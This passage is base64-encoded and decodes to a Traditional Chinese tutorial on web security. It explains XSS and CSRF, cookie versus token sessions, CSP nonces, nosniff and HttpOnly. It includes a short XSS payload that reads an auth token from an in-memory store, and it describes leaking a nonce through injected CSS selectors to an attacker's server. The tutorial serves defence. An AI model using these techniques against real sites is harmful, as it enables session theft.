aflrrnvvIjnlZnoqIDjgIHlgIvkurros4fmlpnmrITkvY3vvInjgIHmnIPooqvlj43lsITlm57poIHpnaLnmoQgVVJMIOWPg+aVuO+8jOaIluaYr+mAj+mBjiBET00g5pON5L2c5aGe6YCy5L6G44CC5LiA5pem5Z+36KGM77yM5a6D5bCx5pyJ6YCZ5YCLIG9yaWdpbiDnmoTlhajpg6jmrIrpmZDvvIzog73oroDmspLmqJkgSHR0cE9ubHkg55qEIGNvb2tpZeOAgWxvY2FsU3RvcmFnZSDot5/poIHpnaLni4DmhYvvvIzkuZ/og73nlKjkvb/nlKjogIXnmoTouqvliIbpgIEgcmVxdWVzdOOAguWug+WIqeeUqOS6humggemdouWwjeS9v+eUqOiAheWFp+WuueeahOS/oeS7u+OAggoKKipDU1JGKirvvJo8bWFyaz7miJHnmoTngI/opr3lmajpgIHlh7rkuobkuIDlgIvmiJHmspLmiZPnrpfpgIHnmoQgcmVxdWVzdOOAgjwvbWFyaz7mlLvmk4rogIXmjozmj6Hlj6bkuIDlgIsgb3JpZ2lu77yM5Zyo6aCB6Z2i5LiK5bWM5YWl5p+Q5YCL5p2x6KW/77yI5ZyW54mH44CBZm9ybeOAgWZldGNo77yJ77yM6Ke455m85LiA5YCL6YCB5b6A55uu5qiZ57ay56uZ55qEIHJlcXVlc3TjgILlj6ropoEgY29va2llIOeahOioreWumuWFgeiose+8jOeAj+imveWZqOWwseacg+iHquWLleW4tuS4iuebruaomee2suermeeahCBjb29raWXvvIzogIwgc2VydmVyIOWFieeciyBjb29raWXvvIzliIbkuI3lh7rpgJnlgIsgcmVxdWVzdCDmmK/kuI3mmK/kvaDmnKzkvoblsLHmg7PpgIHnmoTjgILlroPliKnnlKjkuobngI/opr3lmajmnIPoh6rli5XluLYgY29va2llIOmAmeS7tuS6i+OAggoKLS0tCgojIyDnmbvlhaXmlrnlvI/msbrlrprkuobkvaDopoHpnaLlsI3lk6rkuIDnqK7lqIHohIUKCmFwcCDmgI7purzpqZforYnkvb/nlKjogIXvvIzmsbrlrprkuoblk6rkuIDnqK7lqIHohIXmr5TovIPlmrTph43jgIIKCioqQ29va2llIHNlc3Npb24qKu+8iHNlcnZlciDoqK3kuIDlgIsgc2Vzc2lvbiBjb29raWXvvIzkuYvlvozngI/opr3lmajpgIEgcmVxdWVzdCDliLDpgJnlgIsgc2VydmVy77yM6YO96Ieq5YuV5bi25LiK5a6D77yJ77yaCgotIOacg+iiqyBDU1JGIOaUu+aTiuOAguWIpeeahOe2suermeeZvOi1t+eahCByZXF1ZXN0IOWPr+iDveacg+W4tuiRl+S9oOeahCBjb29raWXvvIzpmaTpnZ4gYFNhbWVTaXRlYO+8iOW+jOmdouacg+ism++8ieaKiuWug+aUlOS4i+S+huOAggotIFhTUyDkuIDmqKPljbHpmqrjgILlroPog73oroDmspLmqJkgSHR0cE9ubHkg55qEIGNvb2tpZe+8jOS5n+iDveeUqOWujOaVtOeahCBzZXNzaW9uIOmAgSBzYW1lLW9yaWdpbiByZXF1ZXN044CCCgoqKlRva2VuIOmpl+itiSoq77yISldU77yM5Lmf5bCx5pivIEpTT04gV2ViIFRva2Vu77yM5oiW6aGe5Ly855qE5a2X5Liy77yM55Sx5L2g6Ieq5bex55qEIEphdmFTY3JpcHQg5pS+6YCy5q+P5YCLIHJlcXVlc3Qg55qEIGBBdXRob3JpemF0aW9uYCBoZWFkZXLvvInvvJoKCi0gQ1NSRiDlpKfoh7TkuIrlsLHkuI3miJDllY/poYzkuobjgILmspLmnIkgY29va2llIOacg+iiq+iHquWLleW4tuS4iu+8jOWBvemAoOeahCByZXF1ZXN0IOS4jeacg+W4tuiRl+aGkeitieOAggotIFhTUyDorormiJDmnIDkuLvopoHnmoTlqIHohIXjgILopoHmmK8gdG9rZW4g5pS+5ZyoIGBsb2NhbFN0b3JhZ2Vg77yMWFNTIOeahCBwYXlsb2FkIOiugOWHuuS+huS5i+W+jO+8jOWwseiDveWcqOS7u+S9leijnee9ruS4iuWGkuWFhemAmeWAi+S9v+eUqOiAhe+8jOebtOWIsCB0b2tlbiDpgY7mnJ/jgIIKCuePvuS7o+eahCBTUEEg5bi455SoIHRva2Vu77yMc2VydmVyIOeUoueUn+mggemdoueahCBhcHAg6YCa5bi455SoIGNvb2tpZeOAggoKLS0tCgojIyBYU1Mg55qE6Ziy57ea77yM5LiA5bGk5LiA5bGk55yLCgp8IOWxpCB8IOiqsOiyoOiyrCB8IOWBmuS7gOm6vCB8CnwtLS18LS0tfC0tLXwKfCBPdXRwdXQgZW5jb2RpbmcgfCBDbGllbnQgfCDnlKjmoYbmnrbnmoTmj5LlgLzoqp7ms5XvvIhge3ZhbHVlfWDvvInvvIzliKXlho3li5XkuI3li5XlsLHnlKggYGlubmVySFRNTGDjgIFgZGFuZ2Vyb3VzbHlTZXRJbm5lckhUTUxg44CBYHYtaHRtbGDjgIIgfAp8IFNhbml0aXphdGlvbiB8IENsaWVudCB8IOmdnuW+l+mhr+ekuuS9v+eUqOiAheWvq+eahCBIVE1MIOaZgu+8jOWFiOS6pOe1piBET01QdXJpZnnvvIzlroPmnIPmioogc2NyaXB0IOi3nyBldmVudCBoYW5kbGVyIOaLv+aOieOAguS4jeimgeiHquW3seWvq+OAgiB8CnwgQ29udGVudCBTZWN1cml0eSBQb2xpY3kgfCBTZXJ2ZXIgfCBgc2NyaXB0LXNyYyAnc2VsZicgJ25vbmNlLVJBTkRPTSdg44CC5LiA5YCLIHJlc3BvbnNlIGhlYWRlcu+8jOWIl+WHuuWTquS6myBzY3JpcHQg5Y+v5Lul5Z+36KGM44CC5LiN56ym5ZCI55qE77yM54CP6Ka95Zmo5LiA5b6L5ouS57WV44CCIHwKfCBIdHRwT25seSBjb29raWUgfCBTZXJ2ZXIgfCBgU2V0LUNvb2tpZTogLi4uOyBIdHRwT25seWDjgIJKUyDoroDkuI3liLDlroPvvIzlj6/mmK8gWFNTIOmAgeWHuueahCByZXF1ZXN0IOmChOaYr+acg+W4tuS4iuWug++8jOimi+S4i+mdouOAiEh0dHBPbmx5IOWPquiDvea4m+WwkeaQjeWus++8jOS4jeiDvemYsuatoiBYU1PjgInjgIIgfAp8IOWtmOmAsuizh+aWmeW6q+eahOWFp+WuueWFiOa4hemBjiB8IFNlcnZlciB8IOWvq+WFpeaZgua4heS4gOasoe+8jOi8uOWHuuaZguS5n+a4heS4gOasoe+8jOS7peWFjeacieS6m+WFp+WuueWcqOWvq+WFpeaqouafpeWKoOS4iuS5i+WJjeWwseW3sue2k+WtmOmAsuWOu+S6huOAgiB8CnwgYFgtQ29udGVudC1UeXBlLU9wdGlvbnNgIHwgU2VydmVyIHwgYG5vc25pZmZg44CC54CP6Ka95Zmo5LiN5YaN5b6e5qqU5qGI55qE5L2N5YWD57WE5Y6754yc5a6D5piv5LuA6bq877yM5omA5Lul5rKS5qiZ6aGe5Z6L55qE5qqU5qGI5LiN5pyD6KKr54yc5oiQ57ay6aCB77yM5rKS5qiZ5oiQIEphdmFTY3JpcHQg55qE5qqU5qGI5Lmf5LiN6IO955W2IHNjcmlwdCDovInlhaXjgIIgfAp8IFRydXN0ZWQgVHlwZXMgfCBDbGllbnQgKyBTZXJ2ZXIgfCDkuIDlgIsgQ1NQIOaMh+S7pO+8iGByZXF1aXJlLXRydXN0ZWQtdHlwZXMtZm9yICdzY3JpcHQnYO+8ieOAguS4gOiIrOWtl+S4suebtOaOpSBhc3NpZ24g57WmIGBpbm5lckhUTUxgIOmAmemhniBzaW5rIOacg+S4n+WHuumMr+iqpOOAgnBvbGljeSDmmK/kvaDoqLvlhornmoTkuIDlgIvlh73lvI/vvIzkvovlpoIgYHRydXN0ZWRUeXBlcy5jcmVhdGVQb2xpY3koJ2FwcCcsIHsgY3JlYXRlSFRNTDogcyA9PiBET01QdXJpZnkuc2FuaXRpemUocykgfSlg77yM5ZG85Y+rIGBwb2xpY3kuY3JlYXRlSFRNTChzdHIpYCDmmYLvvIzngI/opr3lmajmiorlh73lvI/lm57lgrPnmoTlrZfkuLLljIXmiJDkuIDlgIsgYFRydXN0ZWRIVE1MYCDnianku7bvvIxzaW5rIOWPquaUtumAmeeorueJqeS7tuOAguimgeaYryBwb2xpY3kg5a+r5oiQIGBzID0+IHNg77yM5Lu75L2V5a2X5Liy6YO96IO95Y6f5qij6YCy5Y6744CCIHwKCnNpbmsg5oyH55qE5piv5pyD5oqK5a2X5Liy6K6K5oiQIG1hcmt1cCDmiJbnqIvlvI/norznmoQgQVBJ77yM5L6L5aaCIGBpbm5lckhUTUxg44CBYG91dGVySFRNTGDjgIFgZG9jdW1lbnQud3JpdGVg44CBYGV2YWxg44CC6KGo5qC85YmN5YWp5YiX5bCx6JmV55CG5o6J5aSn6YOo5YiG55qE5ZWP6aGM77yM5YW26aSY5bm+5bGk5piv6aGN5aSW55qE5L+d6Zqq44CCCgpUcnVzdGVkIFR5cGVzIOaYr+WcqOmCo+S4gOihjOeoi+W8j+ecn+eahOWft+ihjOaZguaJjeaKk+WIsOmMr++8jOS4jeaYr+WcqCBidWlsZCDnmoTmmYLlgJnjgIJDaHJvbWUgZm9yIFRlc3RpbmcgMTU2IOS4n+WHuiBgVHlwZUVycm9yOiAuLi4gVGhpcyBkb2N1bWVudCByZXF1aXJlcyAnVHJ1c3RlZEhUTUwnIGFzc2lnbm1lbnRg77yMRmlyZWZveCAxNTkg5Lif5Ye6IGBTaW5rIHR5cGUgbWlzbWF0Y2ggdmlvbGF0aW9uIGJsb2NrZWQgYnkgQ1NQYOOAguaJgOS7peimgeaciea4rOippui3keWIsOmCo+S4gOihjO+8jOaJjeacg+eci+WIsOmAmeWAi+mMr+iqpOOAguaUr+aPtOeahOeJiOacrOaYryBDaHJvbWUgODPjgIFGaXJlZm94IDE0OOOAgVNhZmFyaSAyNuOAggoKQ1NQIOeahCBub25jZSDmmK/lj6rnlKjkuIDmrKHnmoTpmqjmqZ/lgLzjgILoqK3kuoYgYHNjcmlwdC1zcmMgJ3NlbGYnICdub25jZS1hYmMxMjMnYCDkuYvlvozvvIxzZXJ2ZXIg5pyD5Zyo5q+P5YCL5q2j55W255qEIGA8c2NyaXB0PmAgdGFnIOS4iuWKoCBgbm9uY2U9ImFiYzEyMyJg77yM54CP6Ka95Zmo5Y+q5Z+36KGM5bi26JGX6YCZ5YCL5YC855qEIGlubGluZSBzY3JpcHTvvIzlj6blpJbliqDkuIrlvp7oh6rlt7Egb3JpZ2luIOi8ieWFpeeahCBzY3JpcHQg5qqU77yM6YCZ5pivIGAnc2VsZidgIOWFgeioseeahOOAguaUu+aTiuiAheWhnumAsuS+hueahCBzY3JpcHQg5rKS5pyJ6YCZ5YCL5YC877yM6ICM5LiUIHNlcnZlciDmr4/mrKHlm57mh4npg73mj5vkuIDlgIvmlrDnmoQgbm9uY2XvvIzmiYDku6XlnKjoiIrpoIHpnaLkuIrnnIvliLDnmoTlgLzvvIzliLDkuobkuIvkuIDpoIHlsLHmspLnlKjkuobjgIIKCjxkZXRhaWxzPgo8c3VtbWFyeT7mt7HlhaXvvJpYU1Mg54K65LuA6bq85YG96YCg5LiN5LqGIG5vbmNlPC9zdW1tYXJ5PgoK5pS75pOK6ICF5aaC5p6c5Y+q6IO95aGeIG1hcmt1cCDpgLLkvobvvIzkvovlpoLkuIDliYfnlZnoqIDvvIzku5blvpflnKjpoIHpnaLpgIHlh7rkuYvliY3lsLHmioogbm9uY2Ug5a+r6YCy6Ieq5bex55qEIGA8c2NyaXB0PmDjgILlj6/mmK8gbm9uY2Ug5pivIHNlcnZlciDmr4/mrKHlm57mh4nmmYLmiY3nlKLnlJ/nmoTvvIzku5bmspLovqbms5XkuovlhYjnn6XpgZPjgIIKCumCo+W+numggemdouS4iuiugOWHuuS+huWRou+8n0NTUCDnlKggcmVzcG9uc2UgaGVhZGVyIOmAgeeahOipse+8jOeAj+imveWZqOacg+aKiuavj+WAiyBgbm9uY2VgIGF0dHJpYnV0ZSDmuIXmiJDnqbrlrZfkuLLvvIzlj6rmnInlt7LntpPlnKjln7fooYznmoQgc2NyaXB0IOiDveW+niBgLm5vbmNlYCDpgJnlgIsgcHJvcGVydHkg6K6A5Yiw5Y6f5pys55qE5YC877yaCgpgYGBqcwpkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdzY3JpcHQnKS5nZXRBdHRyaWJ1dGUoJ25vbmNlJykgIC8vICIiCmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ3NjcmlwdCcpLm5vbmNlICAvLyAiYWJjMTIzIgpgYGAKCua4heaOiSBhdHRyaWJ1dGXvvIzmmK/ngrrkuobkuI3orpPloZ7pgLLkvobnmoQgQ1NTIOiugOWIsCBub25jZeOAguaUu+aTiuiAheeahCBDU1Mg5Y+v5Lul5pu/5q+P5YCL5Y+v6IO955qE5a2X5YWD5ZCE5a+r5LiA5qKd6KaP5YmH77yMYHNjcmlwdFtub25jZV49ImEiXWDjgIFgc2NyaXB0W25vbmNlXj0iYiJdYOKApuKApu+8jOavj+ainei8ieWFpeS4gOW8tee2suWdgOS4jeWQjOeahOiDjOaZr+WcluOAgm5vbmNlIOWmguaenOaYryBgYWAg6ZaL6aCt77yMYHNjcmlwdFtub25jZV49ImEiXWAg5bCx5pyD55Sf5pWI77yM5pS75pOK6ICF55qEIHNlcnZlciDlsLHmnIPmlLbliLAgYGFgIOWwjeaHieeahOiDjOaZr+WcliByZXF1ZXN044CC5Y+q6KaB6aCB6Z2i5rKS5pyJ6YeN5paw6LyJ5YWl77yMbm9uY2Ug5bCx5LiN5pyD6K6K44CC5aGe6YCy5L6G55qEIENTUyDmnIPnlKggYEBpbXBvcnRgIOWGjeWQkeaUu+aTiuiAheeahCBzZXJ2ZXIg6KaB5LiL5LiA5Lu9IENTU++8jHNlcnZlciDlhYjkuI3lm57vvIznrYnmlLbliLDlnJbnmoQgcmVxdWVzdOOAgeefpemBk+esrOS4gOWAi+Wtl+WFg+S5i+W+jO+8jOaJjeWbnuS4gOS7veeMnOesrOS6jOWAi+Wtl+WFg+eahOimj+WJh++8jOS+i+WmgiBgc2NyaXB0W25vbmNlXj0iYWIiXWDjgILpgJnmqKPkuIDnm7TlvoDkuIvnjJzvvIzlsLHog73mi7zlh7rmlbTlgIsgbm9uY2XjgIJhdHRyaWJ1dGUg5riF5oiQ56m65a2X5Liy5LmL5b6M77yM6YCZ5Lqb6KaP5YmH6YO95LiN5pyD55Sf5pWI44CCQ2hyb21lIGZvciBUZXN0aW5nIDE1NiDot58gRmlyZWZveCAxNTkg6YO95pyD5riF5o6J44CC5LiN6YGO5aaC5p6cIENTUCDmmK/nlKggYDxtZXRhPmAg6YCB55qE77yMYXR0cmlidXRlIOacg+eVmeiRl++8jOmAmeaLm+WwsemChOacieapn+acg+OAggoK5aaC5p6cIG5vbmNlIOWvq+atu+aIluS6guaVuOWkquefre+8jOaUu+aTiuiAheWwseWPr+iDveeMnOS4reOAggoK5rKS5pyJIGAndW5zYWZlLWV2YWwnYCDnmoToqbHvvIxDU1Ag5pyD5bCB6Y6WIGBldmFsYOOAguWKoOS6huWug+S5i+W+jO+8jOWmguaenOmggemdouWOn+acrOWwseacieS4gOautSBzY3JpcHQg5pyD5oqK57ay5Z2A5Y+D5pW45Lif6YCyIGBldmFsYO+8jOaUu+aTiuiAheWPquimgeWcqOe2suWdgOWPg+aVuOijoeaUvuiHquW3seeahOeoi+W8j+eivO+8jOWGjemomeS9v+eUqOiAheaJk+mWi+mAmeWAi+e2suWdgO+8jOS7lueahOeoi+W8j+eivOWwseacg+iiq+Wft+ihjOOAggoK5Y+m5aSW77yM55So5LqGIGAnc3RyaWN0LWR5bmFtaWMnYCDnmoToqbHvvIzmnIkgbm9uY2Ug55qEIHNjcmlwdCDljrvovInlhaXliKXnmoQgc2NyaXB0IOaZgu+8jOiiq+i8ieWFpeeahCBzY3JpcHQg5LiN55SoIG5vbmNlIOS5n+iDveWft+ihjOOAguaJgOS7peWmguaenOWFtuS4reacieS4gOaUryBsb2FkZXIg5pyD54Wn57ay5Z2A5Y+D5pW45Y676LyJ5YWlIHNjcmlwdO+8jOaUu+aTiuiAheWwseiDvemAj+mBjuWug+i8ieWFpeiHquW3seeahOeoi+W8j+OAgmAndW5zYWZlLWlubGluZSdgIOi3nyBub25jZSDlr6vlnKjkuIDotbflgJLmmK/mspLpl5zkv4LvvIzlm6DngrrmnIkgbm9uY2Ug55qE5pmC5YCZ77yM54CP6Ka95Zmo5pyD5b+955WlIGAndW5zYWZlLWlubGluZSdg44CCCgo8L2RldGFpbHM+Cgo8ZGV0YWlscz4KPHN1bW1hcnk+5rex5YWl77yabm9zbmlmZiDmmK/lnKjlm57lgrPmqpTmoYjmmYLmsbrlrprnmoTvvIzkuI3mmK/kuIrlgrPmmYI8L3N1bW1hcnk+CgpgWC1Db250ZW50LVR5cGUtT3B0aW9uc2Ag6Lef5a6D6KaB5L+d6K2355qEIGBDb250ZW50LVR5cGVg77yM6YO95pivIHNlcnZlciDmiorlrZjotbfkvobnmoTmqpTmoYjlm57lgrPmmYLmiY3oqK3nmoTvvIzot5/kuIrlgrPpgqPkuIDmrKHnhKHpl5zjgILpgJnmmK/lhanotp/kuI3lkIznmoTlgrPovLjvvJoKCi0gKirkuIrlgrMqKu+8iOS9v+eUqOiAheaKiuaqlOahiOWCs+e1puS9oO+8ieOAgumAmeWAiyByZXF1ZXN0IOS4iueahCBgQ29udGVudC1UeXBlYCDmmK/kuIrlgrPnmoTkurroh6rlt7HloavnmoTvvIzmiYDku6XmlLvmk4rogIXlj6/ku6Xku7vmhI/oqK3lrprjgILkuI3opoHmiorlroPlrZjotbfkvobkuYvlvozmi7/kvobnlKjjgIIKLSAqKuWbnuWCsyoq77yIc2VydmVyIOaKiuaqlOahiOWCs+e1puS+hueci+eahOS6uu+8ieOAgumAmeaZgiBgQ29udGVudC1UeXBlYCDnlLHkvaDnmoQgc2VydmVyIOiHquW3seiore+8jOmAmuW4uOS+neWJr+aqlOWQjeaxuuWumu+8iGAucG5nYCDlsI3mh4kgYGltYWdlL3BuZ2DvvInvvIzlho3liqDkuIogYG5vc25pZmZg44CC54CP6Ka95Zmo5oCO6bq86JmV55CG6YCZ5YCL5qqU5qGI77yM55yL55qE5piv6YCZ5YCLIHJlc3BvbnNl44CCCgpgbm9zbmlmZmAg5Y+r55yL5qqU5qGI6YKj5YCL5Lq655qE54CP6Ka95Zmo55u45L+h5Zue5YKz5pmC55qEIGBDb250ZW50LVR5cGVg77yM5LiN6KaB5YaN5b6e5L2N5YWD57WE5Y6754yc44CC5omA5Lul5YmN5o+Q5piv6YCZ5YCLIGBDb250ZW50LVR5cGVgIOacrOi6q+aYr+WwjeeahOOAguWmguaenOS9oOeFp+aKhOS4iuWCs+iAheWhq+eahOWAvO+8jOWbnuWCs+aIkCBgdGV4dC9odG1sYO+8jGBub3NuaWZmYCDkuZ/mnIPnhafllq7lhajmlLbvvIzmiorlroPnlbbntrLpoIHpoa/npLrlh7rkvobjgILpgJnlgIsgaGVhZGVyIOWPquiyoOiyrOiuk+eAj+imveWZqOeFp+S9oOeahOaomeexpOi1sO+8jOaomeexpOimgeWFiOaomeWwjeOAggoK6YKj54CP6Ka95Zmo5Yiw5bqV5Zyo5LuA6bq85pmC5YCZ5pyD54yc77yf5ZyoIENocm9tZSBmb3IgVGVzdGluZyAxNTYg6LefIEZpcmVmb3ggMTU5IOS4iua4rOippu+8mua6luWCmeS4gOWAi+WtmOi1t+S+hueahOaqlOahiO+8jOWFp+WuueaYr+S4gOWAi+W4tiBgPHNjcmlwdD5gIOeahCBIVE1MIOmggemdou+8jOeUqOS4jeWQjOeahOaomeexpOWbnuWCs++8jOebtOaOpeWcqOWIhumggeijoeaJk+mWi+OAggoKfCDpgIHlh7rnmoQgYENvbnRlbnQtVHlwZWAgfCDmspLmnIkgYG5vc25pZmZgIHwg5pyJIGBub3NuaWZmYCB8CnwtLS18LS0tfC0tLXwKfCDmspLpgIEgfCBzY3JpcHQg5Z+36KGM5LqG77yI54CP6Ka95Zmo54yc5oiQIEhUTUzvvIkgfCDmspLln7fooYwgfAp8IGB0ZXh0L3BsYWluYCB8IOaykuWft+ihjCB8IOaykuWft+ihjCB8CnwgYGltYWdlL3BuZ2AgfCDmspLln7fooYwgfCDmspLln7fooYwgfAp8IGB0ZXh0L2h0bWxgIHwg5Z+36KGM5LqGIHwg5Z+36KGM5LqGIHwKCuWPquimgeato+eiuuaomeaIkCBgaW1hZ2UvcG5nYCDlsLHlpKDkuobvvIzlhanlgIvngI/opr3lmajpg73mspLmnInmiormqJnmiJDlnJbniYfnmoTmqpTmoYjnlbbmiJDntrLpoIHjgILmqJnnsaTmspLpgIHnmoTmmYLlgJnvvIxgbm9zbmlmZmAg5omN5pyJ5L2c55So44CC5a6D5Zyo5Y+m5LiA56iu5Z+36KGM5pa55byP5LiK5pu06YeN6KaB77yM5bCx5pivIGA8c2NyaXB0IHNyYz0iL3VwbG9hZHMveC50eHQiPmAg6YCZ56iuIHRhZ+OAgmBzY3JpcHQtc3JjICdzZWxmJ2Ag5YWB6Kix6Ieq5bexIG9yaWdpbiDnmoTku7vkvZXmqpTmoYjvvIzkuIrlgrPnmoTmqpTmoYjkuZ/nrpflnKjlhafjgILmi7/kuIDlgIvlhaflrrnmmK8gSmF2YVNjcmlwdCDnmoTmqpTmoYjvvIznlKjpgJnnqK7mlrnlvI/ovInlhaXvvJoKCnwg6YCB5Ye655qEIGBDb250ZW50LVR5cGVgIHwg5rKS5pyJIGBub3NuaWZmYCB8IOaciSBgbm9zbmlmZmAgfAp8LS0tfC0tLXwtLS18Cnwg5rKS6YCB44CBYHRleHQvcGxhaW5g44CBYHRleHQvaHRtbGDjgIFgYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtYCB8IOeVtuaIkCBzY3JpcHQg5Z+36KGM5LqGIHwg6KKr5bCB6Y6WIHwKfCBgaW1hZ2UvcG5nYCB8IOiiq+WwgemOliB8IOiiq+WwgemOliB8CgrliqDkuoYgYG5vc25pZmZgIOS5i+W+jO+8jOa4rOmBjueahOavj+S4gOeorumdniBKYXZhU2NyaXB0IOaomeexpO+8jOWFqeWAi+eAj+imveWZqOmDveaLkue1leeVtuaIkCBzY3JpcHQg5Z+36KGM44CC5omA5Lul5Y+q6KaB5LiK5YKz55qE5qqU5qGI54Wn5a6D55yf5q2j55qE6aGe5Z6L5Zue5YKz77yM5bCx5rKS6L6m5rOV5YaS5YWF5L2g55qEIHNjcmlwdOOAggoK5Y+X5a6z55qE5piv56ys5LiJ5YCL5Lq677ya5pS75pOK6ICF5LiK5YKz5LiA5YCL6JeP5LqGIHNjcmlwdCDnmoTmqpTmoYjvvIzkvaDnmoQgc2VydmVyIOaKiuWug+WtmOi1t+S+hu+8jOWPpuS4gOWAi+S9v+eUqOiAheaJk+mWi+Wug+eahOe2suWdgOOAguWQjOS4gOWAi+aqlOahiOimgeaYr+mAj+mBjiBgPGltZz5gIOi8ieWFpe+8jOeAj+imveWZqOWPquacg+aKiuWug+eVtuWclueJh+eahOS9jeWFg+e1hOino+eivO+8jOS4jeacg+Wft+ihjOOAggoKPC9kZXRhaWxzPgoKIyMjIEh0dHBPbmx5IOWPquiDvea4m+WwkeaQjeWus++8jOS4jeiDvemYsuatoiBYU1MKCioqYEh0dHBPbmx5YCDorpMgWFNTIOiugOS4jeWIsCBjb29raWUg55qE5YC877yM5L2G5rKS6L6m5rOV6K6TIFhTUyDkuI3ljrvkvb/nlKjpgJnlgIsgc2Vzc2lvbuOAgioqIFhTUyDpgoTmmK/lj6/ku6XlnKggb3JpZ2luIOijoemdouWft+ihjCBgZmV0Y2goJy90cmFuc2ZlcicsIC4uLilg77yM54CP6Ka95Zmo54Wn5qij6Ieq5YuV5bi25LiKIEh0dHBPbmx5IGNvb2tpZe+8jHNlcnZlciDkuZ/nhafluLjpgJrpgY7pqZforYnjgILlnKggQ2hyb21lIGZvciBUZXN0aW5nIDE1NiDot58gRmlyZWZveCAxNTkg5LiK77yMYGRvY3VtZW50LmNvb2tpZWAg5YiX5Ye65LqGIGBIdHRwT25seWAgY29va2llIOS7peWklueahOaJgOaciSBjb29raWXvvIzogIwgc2FtZS1vcmlnaW4g55qEIGBmZXRjaGAgUE9TVCDpgoTmmK/luLbokZflroPjgIIKCnwg6IO95YGa5Yiw55qE5LqLIHwg5rKS5pyJIGBIdHRwT25seWAgfCDmnIkgYEh0dHBPbmx5YCB8CnwtLS18LS0tfC0tLXwKfCBYU1Mg6K6AIGBkb2N1bWVudC5jb29raWVgIHwg4pyFIHwg4p2MIHwKfCBYU1Mg5oqKIGNvb2tpZSDlgrPliLDmlLvmk4rogIXnmoQgc2VydmVyIHwg4pyFIHwg4p2MIHwKfCBYU1Mg5Zyo5Y+X5a6z6ICF55qE54CP6Ka95Zmo6KOh6YCB5Ye65bey6amX6K2J55qEIHJlcXVlc3QgfCDinIUgfCDinIUgfAp8IOWPl+Wus+iAhemXnOaOieWIhumggeS5i+W+jO+8jOaUu+aTiumChOiDvee5vOe6jCB8IOKchSB8IOKdjCB8Cnwg5b6e5Y+m5LiA5Y+w6KOd572u6YeN5pS+6YCZ5YCLIGNvb2tpZSB8IOKchSB8IOKdjCB8CgrnrKzkuozliJfot5/nrKzkuInliJfnnIvotbfkvobpg73mmK8gWFNTIOeZvOWHuuS4gOWAiyByZXF1ZXN077yM57WQ5p6c5Y275LiN5LiA5qij77yM5Zug54K654CP6Ka95Zmo5Y+q5pyD5oqKIGNvb2tpZSDluLbntaboqK3lroPnmoTpgqPlgIvntrLnq5njgIJYU1Mg5bCNIGBldmlsLmNvbWAg55m8IHJlcXVlc3Qg55qE6Kmx77yM54CP6Ka95Zmo5bi255qE5pivIGBldmlsLmNvbWAg55qEIGNvb2tpZe+8jOS4jeacg+W4tiBgYmFuay5jb21gIOeahOOAguaJgOS7pSBzY3JpcHQg6KaB5oqKIHNlc3Npb24g5Lqk57Wm5pS75pOK6ICF77yM5b6X5YWI5b6eIGBkb2N1bWVudC5jb29raWVgIOiugOWHuuWug+eahOWAvO+8jOWGjeaUvumAsue2suWdgOaIliBib2R5IOijoemAgeWHuuWOu+OAguioreS6hiBgSHR0cE9ubHlg77yMYGRvY3VtZW50LmNvb2tpZWAg6KOh5bCx5rKS5pyJ5a6D77yMc2NyaXB0IOiugOS4jeWIsOWAvO+8jOS5n+WwsemAgeS4jeWHuuWOu+OAglhTUyDlsI0gYGJhbmsuY29tYCDnmbznmoQgcmVxdWVzdCDlgJLmmK/mnIPluLbkuIogY29va2ll77yM5Y+q5pivIGNvb2tpZSDnmoTlgLzkuIDnm7TnlZnlnKjngI/opr3lmajoo6HvvIzmlLvmk4rogIXmi7/kuI3liLDvvIzlj6rog73otoHliIbpoIHplovokZfnmoTmmYLlgJnlgJ/nlKjjgIIKCumChOaYr+imgeiorSBgSHR0cE9ubHlg44CC5rKS6Kit55qE6Kmx77yM5pS75pOK6ICF6IO95oqKIGNvb2tpZSDluLbotbDvvIzlnKjoh6rlt7HnmoTpm7vohabkuIrkuIDnm7TnlKjliLAgc2VydmVyIOe1kOadn+mAmeWAiyBzZXNzaW9uIOeCuuatou+8m+ioreS6huS5i+W+jO+8jOS7luWPquiDvemAj+mBjuWPl+Wus+iAhemWi+iRl+eahOmCo+WAi+WIhumggeaTjeS9nO+8jOWIhumggemXnOS6huWwseaykuS6huOAguS9huS4jeimgeaKiuWug+eVtuaIkCBYU1Mg55qE6Ziy57ea77yM6ZiyIFhTUyDopoHpnaAgb3V0cHV0IGVuY29kaW5nIOWKoOS4iiBDU1DjgIIKCjxkZXRhaWxzPgo8c3VtbWFyeT7mt7HlhaXvvJrmlL7lnKjoqJjmhrbpq5Too6HnmoQgdG9rZW7vvIxYU1Mg5LiA5qij6K6A5b6X5YiwPC9zdW1tYXJ5PgoK5oqKIEpXVCDmiJYgYWNjZXNzIHRva2VuIOaUvuWcqOiomOaGtumrlOijoe+8iFp1c3RhbmTjgIFSZWFjdCBjb250ZXh044CB5pmu6YCa55qEIG1vZHVsZSDorormlbjvvInvvIwqKuavlOaUviBgbG9jYWxTdG9yYWdlYCDlpb3vvIzkvYYgWFNTIOmChOaYr+iugOW+l+WIsCoq44CCWFNTIOWcqOS9oOeahCBvcmlnaW4g6KOh5Z+36KGM77yMSlMg56Kw5b6X5Yiw55qE54uA5oWL77yM5a6D6YO956Kw5b6X5Yiw77yaCgpgYGBqcwovLyBYU1MgcGF5bG9hZO+8jOefpemBkyBzdG9yZSDlnKjlk6roo6EKdXNlQXV0aFN0b3JlLmdldFN0YXRlKCkudG9rZW4KLy8g5oiW5piv5b6e5p+Q5YCLIERPTSDnr4Dpu57msr/okZcgUmVhY3QgZmliZXIgdHJlZSDmib7liLDlhYPku7bnmoQgc3RhdGUKYGBgCgrlroPmr5QgYGxvY2FsU3RvcmFnZWAg5aW955qE5Zyw5pa55pyJ5YWp5YCL77yM6YO95piv5Zyo5rib5bCR5pCN5a6z77yaCgotICoq6YCa55So55qEIFhTUyBwYXlsb2FkIOavlOi8g+mbo+W+l+aJi+OAgioqIGBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKWAg5Zyo5q+P5YCL57ay56uZ5LiK5a+r5rOV6YO95LiA5qij44CC6KaB6K6AIFp1c3RhbmQgc3RvcmXvvIzlvpflhYjmi7/liLDpgqPlgIsgYXBwIOeahCBzdG9yZe+8jOiAjOavj+WAiyBhcHAg6YO95LiN5LiA5qij44CC5omA5Lul5LiA5pSv5ZCM5pmC556E5rqW5b6I5aSa57ay56uZ55qEIHBheWxvYWTvvIzlvojlrrnmmJPmi7/liLAgYGxvY2FsU3RvcmFnZWAg6KOh55qEIHRva2Vu77yM6KaB5ou/6KiY5oa26auU6KO